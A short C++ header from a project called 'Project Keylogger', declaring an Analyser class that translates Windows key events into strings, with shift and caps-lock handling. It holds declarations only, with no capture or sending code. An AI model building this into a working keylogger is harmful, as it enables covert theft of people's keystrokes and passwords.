/**
* Project Keylogger
*/

#ifndef									_ANALYSER_H
#define									_ANALYSER_H

#include								<Windows.h>
#include								<map>

#include								"AEvent.h"

class Analyser
{
public:
	Analyser();
	~Analyser();
	
	std::string&						analysis(AEvent*);

private:
	void								initMap();
	int									isCapsLock() const;
private:
	std::map<int, std::string>			_translateMap;
	std::map<int, std::string>			_translateShiftMap;
};

#endif